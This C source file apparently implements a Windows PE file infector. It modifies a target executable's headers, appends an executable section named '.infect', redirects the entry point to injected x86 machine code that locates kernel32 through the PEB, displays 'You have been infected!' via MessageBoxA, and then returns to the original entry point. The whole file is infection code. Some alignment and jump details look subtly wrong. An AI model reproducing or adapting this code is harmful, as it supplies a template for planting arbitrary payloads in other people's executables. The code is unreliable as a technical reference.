#include "main.h"

int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Missing argument.\n");
		printf("Usage: section path\\to\\PE\\executable (Windows)\n");
		exit(1);
	}

	// argv[1] = Path to executable
	FILE *fr = fopen(argv[1], "r+b");
	FILE *fa = fopen(argv[1], "ab");
	FILE *f[2] = { fr, fa };
	if (fr == NULL || fa == NULL) {
		printf("Error %d opening file.\n",errno);
		exit(1);
	}

	IMAGE_DOS_HEADER imageDosHeader;
	IMAGE_FILE_HEADER imageFileHeader;
	IMAGE_OPTIONAL_HEADER imageOptionalHeader;

	// Verify magic byte (0x4D 0x5A == "MZ")
	imageDosHeader.e_magic = getval(fr, dw, SEEK_SET,0);
	if (imageDosHeader.e_magic != 0x5a4d) {
		printf("Input error. File is not a PE executable.");
		end(f, 1);
	}

	imageDosHeader.e_lfanew = getval(fr, dd, SEEK_SET, 0x3C);

	imageFileHeader.NumberOfSections =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew+6);
	setval_int(fr,imageFileHeader.NumberOfSections+1,
		dw,SEEK_SET,imageDosHeader.e_lfanew+6);

	imageFileHeader.SizeOfOptionalHeader =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 20);

	DWORD ioh_offset = imageDosHeader.e_lfanew + 24;

	// 0x10B => 32-bit
	// 0x20B => 64-bit
	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_offset);

	// TO-DO: Change entry point
	imageOptionalHeader.AddressOfEntryPoint =
		getval(fr, dd, SEEK_SET, ioh_offset+16);
	// Keep a copy
	const DWORD old_entry = imageOptionalHeader.AddressOfEntryPoint;
	if (imageOptionalHeader.Magic == 0x10B)
		imageOptionalHeader.ImageBase =
		   getval(fr,dd, SEEK_SET, ioh_offset+28);
	else
		imageOptionalHeader.ImageBase =
		   getval(fr,8, SEEK_SET, ioh_offset+24);
	imageOptionalHeader.SectionAlignment =
		getval(fr, dd, SEEK_SET, ioh_offset+32);
	imageOptionalHeader.FileAlignment =
		getval(fr, dd, SEEK_SET, ioh_offset+36);
	imageOptionalHeader.SizeOfImage =
		getval(fr, dd, SEEK_SET,ioh_offset + 56);
	imageOptionalHeader.SizeOfHeaders = 
		getval(fr, dd, SEEK_SET, ioh_offset + 60);

	// Import Table
	imageOptionalHeader.DataDirectory[1].VirtualAddress = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 104 : 120)); // import_rva
	imageOptionalHeader.DataDirectory[1].Size = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 108 : 124));

	// Import Address Table (IAT)
	imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 192 : 208)); // iat_rva
	imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));

	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
		// + 40 * (imageFileHeader.NumberOfSections-1);
	IMAGE_SECTION_HEADER lastish;
	lastish.PointerToRawData = 0;
	DWORD lastish_offset = 0;
	// File offset for Import Table and RVA of the containing section
	DWORD import_offset, import_section_offset, import_section_rva = 0;
	// File offset for IAT and RVA of the containing section
	DWORD iat_offset, iat_section_offset, iat_section_rva = 0;
	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
		DWORD current_rva = getval(fr, dd, SEEK_SET,
			ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i + 12);
		DWORD current_offset = getval(fr,dd, SEEK_SET,
			ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i + 20);

		// Find file offset of Import Table
		if (current_rva > import_section_rva && current_rva <= imageOptionalHeader.DataDirectory[1].VirtualAddress) {
			import_section_rva = current_rva;
			import_section_offset = current_offset;
			import_offset = imageOptionalHeader.DataDirectory[1].VirtualAddress - current_rva + current_offset;
			// = imageOptionalHeader.DataDirectory[1].VirtualAddress - import_section_rva + import_section_offset;
		}
		if (current_rva > iat_section_rva && current_rva <= imageOptionalHeader.DataDirectory[12].VirtualAddress) {
			iat_section_rva = current_rva;
			iat_section_offset = current_offset;
			iat_offset = imageOptionalHeader.DataDirectory[12].VirtualAddress - current_rva + current_offset;
			// = imageOptionalHeader.DataDirectory[12].VirtualAddress - iat_section_rva + iat_section_offset;
		}

		// Find PointerToRawData of the last section
		// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
		if (current_offset > lastish.PointerToRawData) {
			lastish.PointerToRawData = current_offset;
			lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * i;
		}
	}

	IMAGE_IMPORT_DESCRIPTOR user32dll_iid;
	DWORD msgbox_iat_rva; // RVA of MessageBoxA in IAT

	// Search for user32.dll
	for (int i = 0; ; ++i) {
		DWORD name_rva = getval(fr, dd, SEEK_SET,import_offset + 20 * i + 12);

		if (name_rva == 0) { // No user32.dll
			printf("No user32.dll\n");
			break;
		}
		BYTE name[MAX_PATH];

		// Read name of import, byte by byte
		fseek(fr, name_rva - imageOptionalHeader.DataDirectory[1].VirtualAddress + import_offset, SEEK_SET);
		for (int j = 0; j < MAX_PATH ; ++j) {
			fread(name+j, 1, 1, fr);
			if (name[j] == 0) break;
		}

		// Found. Search for MessageBoxA
		if (strcasecmp(name,"user32.dll")==0) {
			user32dll_iid.OriginalFirstThunk = getval(fr, dd, SEEK_SET, import_offset + 20 * i);
			user32dll_iid.TimeDateStamp = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.ForwarderChain = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.Name = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.FirstThunk = getval(fr, dd, SEEK_CUR, 0);

			// Ignore functions imported using ordinals
			IMAGE_THUNK_DATA thunk;
			for (int j = 0 ;; j++) {
				// Retrieve RVA of function name to scan
				msgbox_iat_rva = user32dll_iid.FirstThunk +
				   (imageOptionalHeader.Magic == 0x10B ? 4 : 8) * j;
				thunk.u1.AddressOfData = getval(fr,imageOptionalHeader.Magic == 0x10B ? dd : dq,
					SEEK_SET,msgbox_iat_rva - iat_section_rva + iat_section_offset);
				if (thunk.u1.AddressOfData == 0) {  // No MessageBoxA
					printf("No MessageBoxA\n");
					break;
				}

				BYTE function[MAX_PATH];
				// Not accounting for Hint/Names table being in a different section
				// Doesn't seem to be an option since it's not part of Data Directory?
				fseek(fr, thunk.u1.AddressOfData - import_section_rva + import_section_offset + 2, SEEK_SET);
				// Read function name, byte by byte
				for (int k = 0; k < MAX_PATH; k++) {
					fread(function+k, 1, 1, fr);
					if (function[k] == 0) break;
				}
				if (strcasecmp(function,"MessageBoxA")==0) break;
			}
			break;
		}
	}

	lastish.VirtualAddress =
		getval(fr, dd, SEEK_SET, lastish_offset + 12);
	lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_offset + 16);

	DWORD newish_offset = lastish_offset + 40;
	IMAGE_SECTION_HEADER newish = {
		// Name
		".infect",
		// Misc.VirtualSize
		0, // Edited below to reflect actual size
		// VirtualAddress
		closest(lastish.VirtualAddress + lastish.SizeOfRawData, imageOptionalHeader.SectionAlignment),
		// SizeOfRawData
		0, // Edited below
		// PointerToRawData
		0, // Edited ~18 lines below (~ line 192)
		// PointerToRelocations
		0,
		// PointerToLinenumbers
		0,
		// NumberOfRelocations
		0,
		// NumberOfLinenumbers
		0,
		// Characteristics
		0x60000060,
			// IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
			// 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
	};

	// Adding new section
	fseek(fr, 0, SEEK_END);
	const DWORD old_end = ftell(fr);
	newish.PointerToRawData = closest(old_end+1,imageOptionalHeader.SectionAlignment);
	const char *msgCaption = "Notice";
	const char *msgText = "You have been infected!";
	const char *function[] = {"MessageBoxA","user32.dll","LoadLibrary", "GetProcAddress"};

	pad(fa, newish.PointerToRawData - old_end);
	// Written at newish.PointerToRawData
	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
	// Written at newish.PointerToRawData + strlen(msgCaption) + 1
	fwrite(msgText, strlen(msgText)+1, 1, fa);
	for (int i = 0; i < sizeof(function)/sizeof(function[0]); ++i)
		fwrite(function[i], strlen(function[i]), 1, fa);

	// Insert new address of entry point
	imageOptionalHeader.AddressOfEntryPoint = ftell(fa) - newish.PointerToRawData + newish.VirtualAddress;
	setval_int(fr,imageOptionalHeader.AddressOfEntryPoint, dd, SEEK_SET, ioh_offset + 16);

	// Binary codes generated by https://defuse.ca/online-x86-assembler.htm

	// Establish new stack frame
	// push ebp
	write_instruction(fa, 0x55);
	// mov ebp, esp
	write_instruction(fa, 0x89e5);
	// sub esp, 18h
	instruct(fa, 0x83ec, 24);

	// Find kernel32.dll
	// mov ebx, fs:0x30
	instruct(fa, 0x648B1D, 0x30); // 0x64 is a FS segment override prefix, not actually an instruction
	// mov ebx, [ebx + 0x0C]
	instruct(fa, 0x8b5b, 0xc);
	// mov ebx, [ebx + 0x14]
	instruct(fa, 0x8b5b, 0x14);
	// mov ebx, [ebx]
	write_instruction(fa, 0x8b1b);
	// mov ebx, [ebx]
	write_instruction(fa, 0x8b1b);
	// mov ebx, [ebx + 0x10]
	instruct(fa, 0x8b5b, 0x10);
	// mov [ebp-8], ebx
	instruct(fa, 0x895d, -4);

	// Call MessageBoxA
	// push 1030h (Type)
	instruct(fa, 0x68, 0x1030);
	// push msgCaption
	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.VirtualAddress);
	// push msgText
	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.VirtualAddress + strlen(msgCaption) + 1);
	// push 0 (hWnd)
	instruct(fa, 0x6a, 0);
	// call MessageBoxA
	instruct(fa, 0xFF15, imageOptionalHeader.ImageBase + msgbox_iat_rva);

	// jmp back to old AddressOfEntryPoint
	instruct(fa, 0xFF25, imageOptionalHeader.ImageBase + old_entry);

	newish.Misc.VirtualSize = ftell(fa) - newish.PointerToRawData;
	newish.SizeOfRawData = closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment);
	pad(fa, newish.SizeOfRawData - newish.Misc.VirtualSize);

	// Write to Section Header
	setval_char(fr, newish.Name,8, SEEK_SET, newish_offset);
	setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
	setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
	setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
	setval_int(fr, newish.PointerToRawData, dd, SEEK_CUR, 0);
	setval_int(fr,newish.PointerToRelocations, dd, SEEK_CUR, 0);
	setval_int(fr, newish.PointerToLinenumbers, dd, SEEK_CUR, 0);
	setval_int(fr, newish.NumberOfRelocations, dw, SEEK_CUR, 0);
	setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
	setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);

	// Edit SizeOfImage
	imageOptionalHeader.SizeOfImage = closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData,
		imageOptionalHeader.SectionAlignment);
	setval_int(fr, imageOptionalHeader.SizeOfImage, dd, SEEK_SET, ioh_offset + 56);

	// Edit SizeOfHeaders
	imageOptionalHeader.SizeOfHeaders = closest(imageOptionalHeader.SizeOfHeaders + 40,
		imageOptionalHeader.FileAlignment);
	setval_int(fr, imageOptionalHeader.SizeOfHeaders, dd, SEEK_SET, ioh_offset + 60);

	end(f, 0);
}
